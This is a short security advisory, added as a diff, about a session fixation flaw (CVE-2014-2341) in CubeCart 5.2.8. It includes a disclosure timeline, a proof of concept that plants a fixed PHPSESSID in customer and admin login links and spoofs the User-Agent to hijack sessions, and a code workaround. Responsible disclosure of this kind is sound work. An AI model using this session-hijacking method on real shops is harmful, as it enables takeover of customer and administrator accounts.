@@ -1,0 +1,50 @@
+# Exploit Title:     CubeCart 5.2.8 Session Fixation
+# Exploit Author:    James Sibley (absane)
+# Blog:              http://www.pentester.co
+# Download link:     http://www.cubecart.com/download/5.2.8/zip
+# Discovery date:    March 14th, 2014
+# Vendor notified:   March 15th, 2014
+# Vendor fixed:      April 10th, 2014
+# Vendor ack:        http://forums.cubecart.com/topic/48427-cubecart-529-relased/
+# CVE assignment:    CVE-2014-2341
+
+CubeCart 5.2.8 is vulnerable to a session fixation vulnerability.
+
+The only protection offered is via the User-Agent header field, which can spoofed to match the victim.
+
+=======================
+=Proof of Concept.....=
+=======================
+
+*Set the User-Agent for both attacker and victim: 
+Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)
+
+*To attack a customer:
+Victim visits: http://[CubeCart Site]/index.php?PHPSESSID=1337
+
+*To attack an administrator:
+Victim visits: http://[CubeCart Site]/admin.php?PHPSESSID=1337
+
+When the victim logs in, the attacker can visit the same link (using the same User-Agent) and hijack the victim's session.
+
+=======================
+=Cause................=
+=======================
+
+The PHPSESSID parameter is not ignored and allows an attacker to specify their own session id.
+
+The code handling login procedures do not generate new sessions upon successful authentication. 
+
+=======================
+=Mitigation...........=
+=======================
+
+Upgrade to CubeCart >= 5.2.9
+
+If upgrading is not an option, here is a hackish workaround for the session fixation vulnerability:
+
+In admin.class.php add this at line 324:
+$GLOBALS['session']->restart();
+
+In user.class.php add this at line 227:
+$GLOBALS['session']->restart();
